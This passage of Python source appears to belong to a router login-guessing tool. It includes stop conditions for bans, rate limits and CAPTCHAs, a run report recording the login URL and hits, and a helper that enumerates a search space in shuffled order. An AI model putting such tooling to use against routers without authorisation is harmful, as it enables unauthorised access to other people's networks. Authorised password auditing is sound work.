            self.stop("target_unreachable")
        if self._ban_count >= 3:
            self.stop("banned_by_router")
        if self._rate_count >= 5:
            self.stop("rate_limited_by_router")
        if counters.get("CHALLENGE", 0) >= 1:
            self.stop("captcha_challenge")

    # -- report ----------------------------------------------------------
    def _save_report(self) -> None:
        status = self.status()
        report = {
            "tool": config.APP_NAME, "version": config.VERSION,
            "finished": time.strftime("%Y-%m-%d %H:%M:%S"),
            "profile": self.profile.get("name", ""),
            "login_url": self.profile.get("login_url", ""),
            "plan": self.plan,
            "result": {"stop_reason": self.stop_reason, "hits": self.hits,
                       "state": self.state, "error": self.error},
            "counters": status["counters"],
            "reason_counts": status.get("reason_counts", {}),
            "net_kinds": status["net_kinds"],
            "progress": status["progress"],
            "speed": status["speed"], "elapsed": status["elapsed"],
            "latency": status["latency"],
            "throttle_events": self.throttle["events"],
            "calibration": self.calibration,
            "review_files": [r.get("file") for r in self.review],
            "profile_snapshot": {k: v for k, v in self.profile.items()},
        }
        try:
            path = self.store.save_run(report)
            self.emit("report", {"file": os.path.basename(path)})
        except Exception:                                 # noqa: BLE001
            pass


def _coprime(space: int) -> int:
    """A step that visits every index exactly once before repeating."""
    import math
    if space <= 2:
        return 1
    while True:
        a = random.randrange(1, space)
        if math.gcd(a, space) == 1:
            return a


def _retry_after(resp) -> int:
    try:
        value = int((resp.header("retry-after") or "0").strip())
        return max(0, min(value, 30))
    except Exception:
        return 0
